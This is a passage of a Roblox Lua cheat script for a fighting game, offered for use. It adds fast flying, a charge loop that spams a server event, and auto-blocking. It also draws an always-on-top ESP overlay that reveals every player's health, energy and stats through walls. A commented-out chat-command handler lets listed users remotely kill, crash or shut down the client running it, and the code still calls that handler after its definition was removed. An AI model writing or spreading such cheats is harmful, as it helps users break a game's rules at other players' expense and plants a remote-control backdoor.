		while charging and _G.AY == r do game:GetService("ReplicatedStorage").Package.Events.cha:InvokeServer("Blacknwhite27") task.wait() end
	end
end)

game:GetService("UserInputService").InputEnded:Connect(function(key)
	if _G.AY ~= r then return end
	if key.KeyCode == Enum.KeyCode.LeftShift then -- Stop fast fly
		_G.Fast = false
	end
	if key.KeyCode == Enum.KeyCode.X then
		if not table.find(alts, lplr.Name) then return end
		if lplr.PlayerGui.Chat.Frame.ChatBarParentFrame.Frame.BoxFrame.Frame:WaitForChild("ChatBar"):IsFocused() then return end
		charging = false
	end
end)


local rebcolors = { -- >Rebs, Textcolor
	{50000,Color3.fromRGB(255,255,255), "<i><font color='rgb(255,255,255)'>", "</font></i>"}, -- Italic 
	{33333,Color3.fromRGB(0,0,0), "<b><font color='rgb(0,0,0)'>", "</font></b>"}, -- Bold Black
	{20000,Color3.fromRGB(255,255,255), "<i><b><font color='rgb(255,255,255)'>", "</font></b></i>"}, -- Bold Italic White with fast rainbow outline
	{10000,Color3.fromRGB(0,0,0), "<i><b><font color='rgb(0,0,0)'>", "</font></b></i>"}, -- Bold Italic Black with slow rainbow outline
	{5000,Color3.fromRGB(0,255,255), "<b><font color='rgb(0,255,255)'>", "</font></b>"}, -- Bolded Teal
	{2500,Color3.fromRGB(255,0,0), "<b><font color='rgb(255,0,0)'>", "</font></b>"}, -- Bolded Red
	{1000,Color3.fromRGB(255,200,0), "<b><font color='rgb(255,200,0)'>", "</font></b>"}, -- Bolded Orange
	{100,Color3.fromRGB(255,255,255), "<font color='rgb(255,255,255)'>", "</font>"}, -- White
	{3,Color3.fromRGB(0,150,0), "<font color='rgb(0,200,0)'>", "</font>"}, -- Forest Green
	{0,Color3.fromRGB(100,100,100), "<font color='rgb(100,100,100)'>", "</font>"}, -- Gray
}
local statcolors = {
	{1e16,Color3.fromRGB(255,0,255), "<i><b><font color='rgb(255,0,255)'>", "</font></b></i>"}, -- 10qd+ Purple with thin black outline
	{1e15,Color3.fromRGB(255,255,255), "<i><b><font color='rgb(255,255,255)'>", "</font></b></i>"}, -- 1qd+ White with fast rainbow outline
	{1e14,Color3.fromRGB(0,0,0), "<i><b><font color='rgb(0,0,0)'>", "</font></b></i>"}, --- 100T - 1qd Black with slow rainbow outline
	{1e13,Color3.fromRGB(0,255,255), "<i><b><font color='rgb(0,255,255)'>", "</font></b></i>"}, -- 10T - 100T Cyan
	{1e12,Color3.fromRGB(255,0,0), "<i><b><font color='rgb(255,0,0)'>", "</font></b></i>"}, -- 1T - 10T Red
	{1e11,Color3.fromRGB(75,75,255), "<b><font color='rgb(75,75,255)'>", "</font></b>"}, -- 100B - 1T Blue
	{1e9,Color3.fromRGB(250,255,0), "<b><font color='rgb(255,255,0)'>", "</font></b>"}, -- 1B - 100B Yellow
	{1e8,Color3.fromRGB(255,255,255), "<font color='rgb(255,255,255)'>", "</font>"}, -- 100M - 1B White
	{1e6,Color3.fromRGB(0,150,0), "<font color='rgb(0,200,0)'>", "</font>"}, -- 1M - 100M Green
	{0,Color3.fromRGB(100,100,100), "<font color='rgb(100,100,100)'>", "</font>"},-- 0 - 1M gray
}


local labels = { -- Name, XSize, XPos
	{"Rebs",.2,0},
	{"PlrName",.6,.2},
	{"Stats",.2,.79},
}

local function esp(plr)
	if _G.AY ~= r then return end
	while not (plr.Character and plr.Character:FindFirstChild("Humanoid") and plr.Character.Humanoid.MaxHealth ~= 413) do
		if _G.AY ~= r then return end
		wait()
	end
	local sgui = espdirectory:FindFirstChild("ESP_"..plr.Name)
	if not (sgui and sgui:FindFirstChild("Lbl")) then
		local chr = plr.Character
		local espgui = Instance.new("BillboardGui")
		espgui.Parent = espdirectory
		local sgui = espdirectory:FindFirstChild("ESP_"..plr.Name)
		if sgui then 
			espgui:Destroy() 
			espgui = sgui
		end
		espgui.Name = "ESP_"..plr.Name
		espgui.Adornee = chr:WaitForChild("Head")
		espgui.MaxDistance = math.huge
		espgui.Size = UDim2.new(0,100,0,150)
		espgui.ZIndexBehavior = "Global"
		espgui.StudsOffset = Vector3.new(0,3,0)
		espgui.ResetOnSpawn = false
		espgui.AlwaysOnTop = true
		local Lbl = Instance.new("TextLabel")
		if _G.espl == false then
			espgui.Enabled = false
		end
		Lbl.Parent = espgui
		Lbl.Name = "Lbl"
		Lbl.Position = UDim2.new(0,-150,0,-50)
		Lbl.Size = UDim2.new(0,400,0,100)
		Lbl.TextSize = 20
		Lbl.BackgroundTransparency = 1
		Lbl.TextStrokeTransparency = 1
		Lbl.Font = Enum.Font.Gotham
		Lbl.RichText = true
		Lbl.ZIndex = 10
		Lbl.TextYAlignment = "Bottom"
		local hi = Instance.new("Highlight")
		if _G.esph == false then
			hi.Enabled = false
		end
		hi.Parent = espgui
		hi.FillTransparency = .6 
		hi.OutlineTransparency = 0
		--hpbar
		local hpbar = Instance.new("Frame")
		hpbar.Parent = espgui
		hpbar.Name = "green"
		hpbar.Size = UDim2.new(0,100,0,2)
		hpbar.Position = UDim2.new(0,0,0,60)
		hpbar.BackgroundColor3 = Color3.new(1,0,0)
		hpbar.BorderSizePixel = 0
		local green = Instance.new("Frame")
		green.Parent = hpbar
		green.Name = "bar"
		green.Size = UDim2.new(1,0,0,2)
		green.Position = UDim2.new(0,0,0,0)
		green.BackgroundColor3 = Color3.new(0,1,0)
		green.BorderSizePixel = 0
		--kibar
		local kibar = Instance.new("Frame")
		kibar.Parent = espgui
		kibar.Name = "blue"
		kibar.Size = UDim2.new(0,100,0,2)
		kibar.Position = UDim2.new(0,0,0,65)
		kibar.BackgroundColor3 = Color3.new(.15,.15,.15)
		kibar.BorderSizePixel = 0
		local blue = Instance.new("Frame")
		blue.Parent = kibar
		blue.Name = "bar"
		blue.Size = UDim2.new(1,0,0,2)
		blue.Position = UDim2.new(0,0,0,0)
		blue.BackgroundColor3 = Color3.new(0,.5,1)
		blue.BorderSizePixel = 0
	end
	task.wait()
	local sgui = espdirectory:FindFirstChild("ESP_"..plr.Name)
	pcall(function()
		sgui.Adornee = plr.Character:WaitForChild("Head")
	end)
	local hi = sgui.Highlight
	hi.Adornee = plr.Character
	if _G.esph == true then 
		hi.Enabled = true 
	else 
		hi.Enabled = false 
	end
	local Lbl = sgui.Lbl
	local data = plr.Character:WaitForChild("Stats")
	local function avg()
		return (data.Strength.Value + data.Speed.Value + data.Defense.Value + data.Energy.Value) / 4
	end
	local function rebs()
		return data.Rebirth.Value
	end
	local function statcolor()
		for i,v in pairs(statcolors) do
			if avg() >= v[1] then
				return {v[3],v[4],v[2]}
			end
		end
	end
	local function rebcolor()
		for i,v in pairs(rebcolors) do
			if rebs() >= v[1] then
				return {v[3],v[4],v[2]}
			end
		end
	end
	local function getname()
		if plr.Name == plr.DisplayName then
			return "("..plr.Name..")"
		else
			return "("..plr.Name..", "..plr.DisplayName..")"
		end
	end
	local rc = rebcolor()
	local sc = statcolor()
	local nam = getname()
	local hum = plr.Character:WaitForChild("Humanoid")

	if rebs() >= 100000 then
		Lbl.Font = Enum.Font.SpecialElite
		Lbl.TextSize = 20

		Lbl.TextColor3 = Color3.new(1,1,1)
		local grad = Lbl:FindFirstChild("UIGradient") or Instance.new("UIGradient",Lbl)
		grad.Color = ColorSequence.new{
			ColorSequenceKeypoint.new(0, Color3.new(.5,.5,1)),
			ColorSequenceKeypoint.new(.5, Color3.new(0,0,1)),
			ColorSequenceKeypoint.new(1, Color3.new(.5,.5,1)),
		}
		if Lbl.TextStrokeTransparency ~= 0 then
			Lbl.TextStrokeTransparency = 0
			rainbow(Lbl, "TextStrokeColor3", rainbows)
		end
	elseif rebs() >= 50000 then
		hi.FillTransparency = 0
		hi.FillColor = Color3.new(.5,.5,.5)
		hi.OutlineColor = Color3.new(1,0,1)
		Lbl.TextStrokeTransparency = .5
		Lbl.TextTransparency = 0
		Lbl.TextColor3 = Color3.new(1,1,1)
		Lbl.TextStrokeColor3 = Color3.new(1,0,1)
		Lbl.Font = Enum.Font.GothamBold
		Lbl.TextSize = 20
		local grad = Lbl:FindFirstChild("UIGradient") or Instance.new("UIGradient",Lbl)
		grad.Color = ColorSequence.new{
			ColorSequenceKeypoint.new(0, Color3.new(1,1,1)),
			ColorSequenceKeypoint.new(.5, Color3.new(1,0,1)),
			ColorSequenceKeypoint.new(1, Color3.new(.3,.3,.3)),
		}

		grad.Rotation = 0
        rc = {"<i>","</i>",Color3.new(1,0,1)} -- Fill
		sc = {"<i>","</i>",Color3.new(0,0,0)} -- Outline
	elseif rebs() >= 33333 then
		hi.FillTransparency = 0
		hi.FillColor = Color3.new(0,0,0)
		hi.OutlineColor = Color3.new(1,1,1)
		Lbl.TextStrokeTransparency = 0
		Lbl.TextTransparency = 0
		Lbl.TextStrokeColor3 = Color3.new(1,1,1)
		rc = {"<b>","</b>",Color3.new(0,0,0)} -- Fill
		sc = {"<b>","</b>",Color3.new(1,1,1)} -- Outline
	elseif avg() >= 1e15 then
		if Lbl.TextStrokeTransparency ~= 0 then 
			Lbl.TextStrokeTransparency = 0
			spawn(function()
				while avg() >= 1e15 and task.wait(.1) and _G.AY == r do
					game:GetService("TweenService"):Create(Lbl, TweenInfo.new(.1), {TextStrokeColor3 = Color3.fromRGB(math.random(0,255),math.random(0,255),math.random(0,255))}):Play()
					game:GetService("TweenService"):Create(hi, TweenInfo.new(.1), {OutlineColor = Color3.fromRGB(math.random(0,255),math.random(0,255),math.random(0,255))}):Play()
				end
				Lbl.TextStrokeTransparency = 1
			end)
		end
	elseif avg() >= 1e14 then
		if Lbl.TextStrokeTransparency ~= 0 then
			Lbl.TextStrokeTransparency = 0
			spawn(function()
				while avg() >= 1e14 and task.wait(.5) and _G.AY == r do 
					game:GetService("TweenService"):Create(Lbl, TweenInfo.new(.5), {TextStrokeColor3 = c}):Play()
					game:GetService("TweenService"):Create(hi, TweenInfo.new(.5), {OutlineColor = c}):Play()
				end
				Lbl.TextStrokeTransparency = 1
			end)
		end
	else 
		if rebs() < 10000 then
			Lbl.TextStrokeTransparency = 1
		end
		hi.OutlineColor = sc[3]
	end
	if rebs() >= 33333 then
	elseif rebs() >= 20000 then 
		if math.floor(hi.FillTransparency*10)/10 ~= .4 then
			hi.FillTransparency = .4
			Lbl.TextStrokeTransparency = 0
			task.spawn(function()
				while rebs() < 33333 and task.wait(.1) and _G.AY == r do 
					game:GetService("TweenService"):Create(Lbl, TweenInfo.new(.1), {TextStrokeColor3 = Color3.fromRGB(math.random(0,255),math.random(0,255),math.random(0,255))}):Play()
					game:GetService("TweenService"):Create(hi, TweenInfo.new(.1), {FillColor = Color3.fromRGB(math.random(0,255),math.random(0,255),math.random(0,255))}):Play()
				end
				hi.FillTransparency = 1
				Lbl.TextStrokeTransparency = 1
			end)
		end
	elseif rebs() >= 10000 then
		if math.floor(hi.FillTransparency*10)/10 ~= .5 then
			task.spawn(function()
				while rebs() < 20000 and task.wait(.5) and _G.AY == r do 
					hi.FillTransparency = .5
					Lbl.TextStrokeTransparency = 0
					game:GetService("TweenService"):Create(Lbl, TweenInfo.new(.5), {TextStrokeColor3 = c}):Play()
					game:GetService("TweenService"):Create(hi, TweenInfo.new(.5), {FillColor = c}):Play()
				end 
				hi.FillTransparency = 1
				Lbl.TextStrokeTransparency = 1
			end)
		end
	else
		hi.FillColor = rc[3]
	end
	Lbl.Text = rc[1]..format2(data.Rebirth.Value).." "..plr.DisplayName.." | "..rc[2]..sc[1]..format(avg()).." | "..format(hum.Health).."/"..format(hum.MaxHealth)..sc[2]
end

function iterPageItems(pages)
	return coroutine.wrap(function()
		local pagenum = 1
		while true do
			for _, item in ipairs(pages:GetCurrentPage()) do
				coroutine.yield(item, pagenum)
			end
			if pages.IsFinished then
				break
			end
			pages:AdvanceToNextPageAsync()
			pagenum = pagenum + 1
		end
	end)
end
local friendPages = game.Players:GetFriendsAsync(lplr.UserId)
local usernames = {}
for item, pageNo in iterPageItems(friendPages) do
	table.insert(usernames, item.Username)
end

-- Add a player
function addplr(plr)
	while not game.ReplicatedStorage.Datas:FindFirstChild(plr.UserId) do wait() end
	-- If target is hidden and plr not bypassed then hide
	local data = game.ReplicatedStorage.Datas:WaitForChild(plr.UserId)
	while not (
		data:FindFirstChild("Strength") and
			data:FindFirstChild("Rebirth") and
			data:FindFirstChild("Zeni")) do 
		wait() 
	end
	local avg = (data.Strength.Value + data.Speed.Value + data.Defense.Value + data.Energy.Value) / 4

	local button = Instance.new("TextButton")
	button.Parent = fr12
	local bcorner = Instance.new("UICorner")
	bcorner.Parent = button
	bcorner.CornerRadius = corner
	button.BorderSizePixel = 0
	button.Visible = true
	

	button.Size = UDim2.new(.9,0,1/18,0)
	button.Name = plr.Name
	button.TextScaled = false
	button.TextSize = 10
	button.RichText = true
	button.BackgroundColor3 = colortheme--Color3.new(0,0,0)

	button.Font = Enum.Font.Gotham
	button.BorderSizePixel = 0
	button.BackgroundTransparency = .5
	button.TextTransparency = 1
	button.Activated:Connect(function()
		if targetval.Value == plr then 
			targetval.Value = nil
		else
			targetval.Value = plr
		end
	end)
	button.MouseButton2Up:Connect(function()
		button.Visible = false
		wait(8)
		if button then button.Visible = true end
	end)

    local hpbar = Instance.new("Frame",button)
    hpbar.Size = UDim2.new(1,-2,0,2)
    hpbar.BackgroundColor3 = Color3.new(0,1,0)
    hpbar.BackgroundTransparency = .5
    hpbar.BorderSizePixel = 0
    hpbar.Position = UDim2.new(0,.5,0,0)
    hpbar.ZIndex = 1
    local hpcorner = Instance.new("UICorner",hpbar)
    hpcorner.CornerRadius = corner

	local avgval = Instance.new("NumberValue")
	avgval.Parent = button
	avgval.Name = "Avg"
	avgval.Value = (data.Strength.Value + data.Speed.Value + data.Defense.Value + data.Energy.Value) / 4
	local rebsval = Instance.new("NumberValue")
	rebsval.Parent = button
	rebsval.Name = "Rebs"
	rebsval.Value = data.Rebirth.Value

	task.spawn(function()esp(plr)end)
	local function addchr(chr)
		if _G.AY ~= r then return end
		local sgui = espdirectory:WaitForChild("ESP_"..plr.Name)
		local greenbar = sgui.green.bar
		local bluebar = sgui.blue.bar
		local Ki = chr:WaitForChild("Stats"):WaitForChild("Ki")
		local hum = chr:WaitForChild("Humanoid")
		if data.Allignment.Value == "Good" then
			bluebar.BackgroundColor3 = Color3.new(0,.5,1)
		else
			bluebar.BackgroundColor3 = Color3.new(1,0,1)
		end
		sgui.Adornee = chr.Head
		sgui.Highlight.Adornee = chr
		if plr == lplr then
			game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList,false)
		end
		esp(plr)
		game:GetService("TweenService"):Create(greenbar , TweenInfo.new(1), {Size = UDim2.new(0,100/(hum.MaxHealth/hum.Health),0,2)}):Play()
		game:GetService("TweenService"):Create(bluebar , TweenInfo.new(1), {Size = UDim2.new(0,100*(Ki.Value/Ki.MaxValue),0,2)}):Play()
        game:GetService("TweenService"):Create(hpbar, TweenInfo.new(1), {Size = UDim2.new(hum.Health/hum.MaxHealth,-1,0,2)}):Play()
		pcall(function()
			Ki.Changed:Connect(function()
				if _G.AY ~= r then return end
				game:GetService("TweenService"):Create(bluebar , TweenInfo.new(1), {Size = UDim2.new(0,100*(Ki.Value/Ki.MaxValue),0,2)}):Play()
			end)
		end)
		hum.HealthChanged:Connect(function()
			if _G.AY ~= r then return end
			game:GetService("TweenService"):Create(greenbar , TweenInfo.new(1), {Size = UDim2.new(0,100/(hum.MaxHealth/hum.Health),0,2)}):Play()
			game:GetService("TweenService"):Create(bluebar , TweenInfo.new(1), {Size = UDim2.new(0,100*(Ki.Value/Ki.MaxValue),0,2)}):Play()
            game:GetService("TweenService"):Create(hpbar, TweenInfo.new(1), {Size = UDim2.new(hum.Health/hum.MaxHealth,-1,0,2)}):Play()
			esp(plr) 
		end)
	end
    plr.CharacterAdded:Connect(function(chr)
        if _G.AY == r then
            if plr == lplr then
                game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList,false)
            end
            addchr(chr)
        end
    end)

	if plr.Character then
		task.spawn(function()addchr(plr.Character)end)
	end

	for i,lblval in pairs(labels) do
		local l = Instance.new("TextLabel")
		l.Parent = button
		l.Name = lblval[1]
		l.Size = UDim2.new(lblval[2],0,1,0)
		l.Position = UDim2.new(lblval[3],0,0,0)
		l.TextColor3 = Color3.new(.1,.1,.1)
		l.BackgroundTransparency = 1
		l.TextScaled = false 
		l.TextSize = 15
		l.RichText = true
		l.Font = Enum.Font.Gotham
		l.BorderSizePixel = 0
		l.TextStrokeTransparency = 1

		if lblval[1] == "Rebs" then
			local t1 = tick()
			l.TextXAlignment = "Left"
			l.TextSize = 18
			function update()
				if _G.AY ~= r then return end
				spawn(function() esp(plr) end)
				local rebs = data.Rebirth.Value
				rebsval.Value = rebs
				if rebs >= 1000 then
					l.Text = "<b>"..format2(rebs).."</b>"
				else
					l.Text = rebs
				end
                if rebs >= 100000 then
                    l.Text = rebs
                    l.Font = Enum.Font.SpecialElite
                    l.TextSize = 20
                    l.TextColor3 = Color3.new(1,1,1)
                    local grad = Instance.new("UIGradient",l)
                    grad.Color = ColorSequence.new{
                        ColorSequenceKeypoint.new(0, Color3.new(.5,.5,1)),
                        ColorSequenceKeypoint.new(.5, Color3.new(0,0,1)),
                        ColorSequenceKeypoint.new(1, Color3.new(.5,.5,1)),
                    }
                    if l.TextStrokeTransparency ~= 0 then
                        l.TextStrokeTransparency = 0
                        rainbow(l, "TextStrokeColor3", rainbows)
                    end
                elseif rebs >= 50000 then
                    l.Font = Enum.Font.GothamBold
                    l.TextSize = 20
                    l.TextColor3 = Color3.new(1,1,1)
                    if l.TextStrokeTransparency ~= 0 then
                        l.TextStrokeTransparency = 0 
                        local grad = Instance.new("UIGradient",l)
                        grad.Color = ColorSequence.new{
                            ColorSequenceKeypoint.new(0, Color3.new(1,1,1)),
                            ColorSequenceKeypoint.new(.5, Color3.new(1,0,1)),
                            ColorSequenceKeypoint.new(1, Color3.new(0,0,0)),
                        }
                        grad.Rotation = -85
                    end
                elseif rebs >= 33333 then
                    l.TextStrokeTransparency = 0 
                    l.TextColor3 = Color3.new(0,0,0)
                    l.TextStrokeColor3 = Color3.new(1,1,1)
                elseif rebs >= 20000 then
                    if l.TextStrokeTransparency ~= 0 then
                        l.TextStrokeTransparency = 0
                        spawn(function()
                            while data:WaitForChild("Rebirth").Value < 33333 and task.wait(.1) do
                                game:GetService("TweenService"):Create(l, TweenInfo.new(.1), {TextStrokeColor3 = Color3.fromRGB(math.random(0,255),math.random(0,255),math.random(0,255))}):Play()
                            end
                            l.TextStrokeTransparency = 1
                        end)
                    end
                elseif rebs >= 10000  then
                    if l.TextStrokeTransparency ~= 0 then
                        l.TextStrokeTransparency = 0
                        spawn(function()
                            while data.Rebirth.Value < 20000 and task.wait(.5) do
                                game:GetService("TweenService"):Create(l, TweenInfo.new(.5), {TextStrokeColor3 = c}):Play()
                            end
                            l.TextStrokeTransparency = 1
                        end)
                    end
                elseif rebs < 10000 then
                    l.TextStrokeTransparency = 1
                end
                if rebs < 33333 then
                    for i,v in pairs(rebcolors) do
                        if rebs >= v[1] then
                            l.TextColor3 = v[2]
                            break
                        end
                    end
                end
			end
			while not data:FindFirstChild("Rebirth") do wait() end
			data:WaitForChild("Rebirth").Changed:Connect(update)
			update()
		elseif lblval[1] == "PlrName" then
			l.TextXAlignment = "Center"
		elseif lblval[1] == "Stats" then
			l.TextXAlignment = "Right"
			local plrnamelbl = button.PlrName
			l.TextSize = 15
			function update()
				if _G.AY ~= r then return end
				local avg = (data.Strength.Value + data.Speed.Value + data.Defense.Value + data.Energy.Value) / 4
				avgval.Value = avg
				if plr.Character and espdirectory then
					spawn(function() esp(plr) end)
				end
				button.LayoutOrder = -(math.sqrt(avg))
                if data.Rebirth.Value >= 33333 and data.Rebirth.Value < 50000 then
                    l.TextColor3 = Color3.new(0,0,0)
                    l.TextStrokeColor3 = Color3.new(1,1,1)
                    l.TextStrokeTransparency = 0
                    plrnamelbl.TextColor3 = Color3.new(0,0,0)
                    plrnamelbl.TextStrokeColor3 = Color3.new(1,1,1)
                    plrnamelbl.TextStrokeTransparency = 0
                elseif avg >= 1e16 or data.Rebirth.Value >= 33333 then
                else
                    for i,v in pairs(statcolors) do
                        if avg >= v[1] then
                            l.TextColor3 = v[2]
                            plrnamelbl.TextColor3 = v[2]
                            break
                        end
                    end
                end
				local friend = ""
				if table.find(usernames, plr.Name) then friend = " 😎 " end
				if data.Rebirth.Value >= 100000 then
					l.Font = Enum.Font.SpecialElite
					l.TextSize = 15
					l.Text = format(avg)
					l.TextColor3 = Color3.new(1,1,1)
					plrnamelbl.Font = Enum.Font.SpecialElite
					plrnamelbl.TextSize = 20
					plrnamelbl.Text = plr.Name
					plrnamelbl.TextColor3 = Color3.new(1,1,1)
					local grad = l:FindFirstChild("UIGradient") or Instance.new("UIGradient",l)
					grad.Color = ColorSequence.new{
						ColorSequenceKeypoint.new(0, Color3.new(.5,.5,1)),
						ColorSequenceKeypoint.new(.5, Color3.new(0,0,1)),
						ColorSequenceKeypoint.new(1, Color3.new(.5,.5,1)),
					}
					if l.TextStrokeTransparency ~= 0.1 then
						l.TextStrokeTransparency = 0.1
						rainbow(l, "TextStrokeColor3", rainbows)
					end
					local grad = plrnamelbl:FindFirstChild("UIGradient") or Instance.new("UIGradient",plrnamelbl)
					grad.Color = ColorSequence.new{
						ColorSequenceKeypoint.new(0, Color3.new(.5,.5,1)),
						ColorSequenceKeypoint.new(.5, Color3.new(0,0,1)),
						ColorSequenceKeypoint.new(1, Color3.new(.5,.5,1)),
					}
					if plrnamelbl.TextStrokeTransparency ~= 0.1 then
						plrnamelbl.TextStrokeTransparency = 0.1
						rainbow(plrnamelbl, "TextStrokeColor3", rainbows)
					end
				elseif avg >= 1e16 then
					if l.TextStrokeTransparency ~= 0 then
						l.TextColor3 = Color3.new(1,1,1)
						l.TextStrokeTransparency = 0 
						l.TextSize = 20
						l.Font = Enum.Font.GothamBold
						l.Text = format(avg)
						local grad = Instance.new("UIGradient",l)
						grad.Color = ColorSequence.new{
							ColorSequenceKeypoint.new(0, Color3.new(1,1,1)),
							ColorSequenceKeypoint.new(.5, Color3.new(1,0,1)),
							ColorSequenceKeypoint.new(1, Color3.new(0,0,0)),
						}
						grad.Rotation = 85
						plrnamelbl.TextColor3 = Color3.new(1,1,1)
						plrnamelbl.TextStrokeTransparency = 0
						plrnamelbl.Font = Enum.Font.GothamBold
						plrnamelbl.Text = plr.DisplayName
						plrnamelbl.TextSize = 20
						local grad = Instance.new("UIGradient",plrnamelbl)
						grad.Color = ColorSequence.new{
							ColorSequenceKeypoint.new(0, Color3.new(1,1,1)),
							ColorSequenceKeypoint.new(.5, Color3.new(1,0,1)),
							ColorSequenceKeypoint.new(1, Color3.new(0,0,0)),
						}
						grad.Rotation = 85
					end
                elseif avg >= 1e12 then
					if plr.Name == plr.DisplayName then
						plrnamelbl.Text = "<b><i>"..friend..""..plr.Name..friend.."</i></b>"
					else
						plrnamelbl.Text = "<b><i>"..friend..plr.DisplayName..friend.."\n<font size='10'>@"..plr.Name.."</font></i></b>"
					end
					l.Text = "<b><i>"..format(avg).."</i></b>"
					if data.Rebirth.Value < 33333 then
						if avg >= 1e15  then
							l.TextStrokeTransparency = 0
							plrnamelbl.TextStrokeTransparency = 0
							rainbow(l, "TextStrokeColor3", rainbows2)
							rainbow(plrnamelbl, "TextStrokeColor3", rainbows2)
						elseif avg >= 1e14 then
							l.TextStrokeTransparency = 0
							plrnamelbl.TextStrokeTransparency = 0
							rainbow(l, "TextStrokeColor3", rainbows)
							rainbow(plrnamelbl, "TextStrokeColor3", rainbows)
						else
							l.TextStrokeTransparency = 1
							plrnamelbl.TextStrokeTransparency = 1
						end

					end
				elseif avg >= 1e9 then
					if plr.Name == plr.DisplayName then
						plrnamelbl.Text = "<b>"..friend..""..plr.Name..friend.."</b>"
					else
						plrnamelbl.Text = "<b>"..friend..plr.DisplayName..friend.."\n<font size='10'>@"..plr.Name.."</font></b>"
					end
					l.Text = "<b>"..format(avg).."</b>"
				else
					l.Text = format(avg)
					if plr.Name == plr.DisplayName then
						plrnamelbl.Text = friend..""..plr.Name..friend
					else
						plrnamelbl.Text = friend..plr.DisplayName..friend.."\n<font size='10'>@"..plr.Name.."</font>"
					end
				end
                hpbar.BackgroundColor3 = l.TextColor3
                game:GetService("TweenService"):Create(hpbar, TweenInfo.new(.5), {Size = UDim2.new(plr.Character.Humanoid.Health/plr.Character.Humanoid.MaxHealth,-1,0,2)}):Play()
			end
			data:WaitForChild("Speed").Changed:Connect(update)
			data:WaitForChild("Strength").Changed:Connect(update)
			data:WaitForChild("Energy").Changed:Connect(update)
			data:WaitForChild("Defense").Changed:Connect(update)
			data:WaitForChild("Rebirth").Changed:Connect(update)
			update()
		end
	end
end

function updlist()
	task.wait()
	local bSize = layout12.CellSize.Y.Offset
	local bOffset = layout12.CellPadding.Y.Offset
	local nPlrs = #game.Players:GetChildren()
	game:GetService("TweenService"):Create(fr12, TweenInfo.new(.05), {Size = UDim2.new(1,0,0,-5+(bSize + bOffset)*nPlrs)}):Play()
end

--[[function admin(plr)
	plr.Chatted:Connect(function(msg)
		if not _G.AY == r then return end
		local txt = string.split(msg,".") -- Splits the message into a table, with each value split up by periods in the message. Ex: ("kill.PlayerName123" > {"kill","PlayerName123"})
		if string.find(string.lower(lplr.Name),string.lower(txt[2])) then -- If you can find a part of the player's name in the second message's word, then
			if txt[1] == "kill" then -- If the first part of the message is: ({"kill","PlayerName123"})
				lplr.Character:BreakJoints()
			elseif txt[1] == "crash" then
				while true do print("bye") end
			elseif txt[1] == "kick" then -- Ex: kill.username
				game:Shutdown()
			elseif txt[1] == "rip" then -- Ex: rip.username
				game:GetService("ReplicatedStorage").Package.Events.reb:InvokeServer()
				while true do print("bye") end
			end
		end
	end)
end]]

leavep = game.Players.PlayerRemoving:Connect(function(plr)
	if _G.AY ~= r then
		leavep:Disconnect()
		return
	end
	local n = plr.Name-- Plr name
	local f = fr12:WaitForChild(n)
	if f then
		f:Destroy()
		updlist()
		local b = table.find(logged, n) -- If they were logged
		if b then table.remove(logged, b) end
		local statb = table.find(statlogged, n)
		if statb then table.remove(statlogged, statb) end
		if espdirectory:FindFirstChild("ESP_"..n) then
			espdirectory["ESP_"..n]:Destroy()
		end
	end
end)

spawnp = game.Players.PlayerAdded:Connect(function(plr)
	if _G.AY ~= r then
		spawnp:Disconnect()
		return
	end
	spawn(function() addplr(plr) end)
	updlist()
	if table.find(users, plr.Name) then
		admin(plr)
	end
end)

task.spawn(function()
	for i,plr in pairs(game.Players:GetChildren()) do
		task.spawn(function() addplr(plr) end)
		updlist()
		if table.find(users, plr.Name) then
			admin(plr)
		end
	end
end)

function getchr()
	if lplr.Character and lplr:FindFirstChild("Status") and lplr.Status:WaitForChild("Fused").Value ~= "None" then
		return game.Players[lplr.Status.Fused.Value].Character
	else
		return lplr.Character
	end
end

function extra(stat)
	local chr = getchr()
	local hum = chr:WaitForChild("Humanoid")
	local Ki = chr:WaitForChild("Stats").Ki
	local fused = lplr:WaitForChild("Status"):WaitForChild("Fused")
	if fused.Value ~= "None" and stat ~= "Rebirth" then
		return " ("..format(chr.Stats[stat].Value)..")"
	else
		return ""
	end
end

task.spawn(function()
	while _G.AY == r and wait() do
		numplrs.Text = "#Players: "..#game.Players:GetChildren()
		pingL.Text = "Ping: "..math.floor(game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValue()).."ms"
		local form = lplr.Status.Transformation.Value -- Current character form

		if ldata:FindFirstChild(form) and form ~= "None" then
			local currentval = 	ldata[form].Value -- Current form mastery in seconds
			local txt = "("..form..") "
			if currentval == 332526 then
				txt = txt.." Maxed"
			end
			if currentval < 5767 then
				txt = txt..format2(currentval).."/5,767/332,526"
			elseif currentval < 332526 then
				txt = txt..format2(currentval).."/332,526"
			end
			txt = txt.." ("..tostring(math.floor(currentval/332526*100)).."%)"
			formmastery.Text = txt
			formmastery.Visible = true
		else
			formmastery.Visible = false
			formmastery.Text = "You shouldn't be seeing this.."
		end
	end
end)

task.spawn(function()
	while _G.AY == r and task.wait() do
		if scgui.Enabled == true then
			game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList,false)
		else
			game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList,true)
		end
		if _G.Abv == true then
			local MainFrame = lplr.PlayerGui:WaitForChild("Main"):WaitForChild("MainFrame")
			local Bars = MainFrame.Bars
			pcall(function()
				local hum = lplr.Character.Humanoid
				local Ki = lplr.Character.Stats.Ki
				Bars.Health.TextLabel.Text = "HEALTH: "..format(hum.Health).." / "..format(hum.MaxHealth)
				Bars.Energy.TextLabel.Text = "ENERGY: "..format(Ki.Value).." / "..format(Ki.MaxValue)
			end)
			pcall(function()
				MainFrame.Indicator.Zeni .Text = format(ldata.Zeni.Value).." Zeni"
				for i,stat in pairs(t) do
					if MainFrame:WaitForChild("Frames"):WaitForChild("Stats"):FindFirstChild(stat) and stat ~= "Rebirth" then
						local lbl = MainFrame.Frames.Stats[stat]
						local chrstat = lplr.Character.Stats[stat].Value
						if chrstat ~= ldata[stat].Value then 
							lbl.Text = stat..": "..format(ldata[stat].Value)..extra(stat).." (+"..format(chrstat-ldata[stat].Value)..")"
						else 
							lbl.Text = stat..": "..format(ldata[stat].Value)..extra(stat)
						end
					end
				end
			end)
		end
		if lplr.Status:FindFirstChild("Blocking") and lplr.Status.Blocking.Value == false and blocking == true then
			task.spawn(function()
				game.ReplicatedStorage.Package.Events.block:InvokeServer(true)
			end)
		end
	end
	scgui:Destroy()
	togglescgui:Destroy()
	scgui = nil
	togglescgui = nil
end)

_G.Weld = Instance.new("WeldConstraint",lplr.Character)
wait(.2)
